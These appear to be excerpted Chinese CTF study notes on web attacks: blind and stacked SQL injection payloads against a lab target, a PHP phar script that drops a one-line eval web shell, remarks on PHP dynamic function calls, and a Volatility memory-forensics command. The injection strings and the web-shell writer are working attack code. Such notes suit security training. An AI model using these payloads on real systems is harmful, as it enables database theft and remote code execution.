...
1' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),第几个字母,1)) = 114%23
```
...
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),第几个字母,1)) = 117%23
```
...
> 一般的堆叠注入是只能看一下数据库名和表名，但是我们可以使用预定义的方法绕过从而去读取数据

==反引号使用在表名全是数子组成的情况，这里为了安全，所有的表名都用数字包裹==
...
```sql
// prepare 预定义名 from '操作'

mysql> prepare test from 'select * from users';
...
> 有多种解法，思路都是做一个表名的替换；这里只说预定义的，因为预定义不修改数据

过滤了大量的关键字，只能用堆叠注入，这里直接给出payload；大小写绕过`prEpare`，字符串拼接绕`select`

```
2';set @ctf=CONCAT('sel', 'ect flag from `1919810931114514`;');prEpare flag from @ctf;execute flag;
```

![image-20240611013541297](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240611013541297.png)
...
phar 的`stub`头是可以写入一句话木马的，这个一句话木马会在解析phar文件的时候自动执行，此外，我们也可以在压缩文件处创建一句话木马；只要服务器是可以触发phar伪协议的就可以写入一句话木马；例题：[NISACTF 2022]bingdundun~
...
$o = new Test();
$phar->setMetadata($o); //将自定义的meta-data存入manifest，这里的内容后续在做包含的时候会自动被反序列化
$phar->addFromString("test.php", '<?php fputs(fopen(\'shell.php\', \'w\'), \'<?php eval($_POST["cmd21"])?>\');?>'); //添加要压缩的文件	经过测试，真正生效的在这里！
$phar->stopBuffering();    //签名自动计算
?>
```
...
像这种直接函数执行方法被称为动态函数，**只适用于PHP7后的版本**
...
所以在CTF题上，如果遇到第一种不能执行的时候，可能就是PHP5的版本，不妨尝试一些di'er'zhong
...
```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 filescan |grep -E "png|jpg|gif|zip|rar|7z|pdf|txt|doc|flag|de's'k"
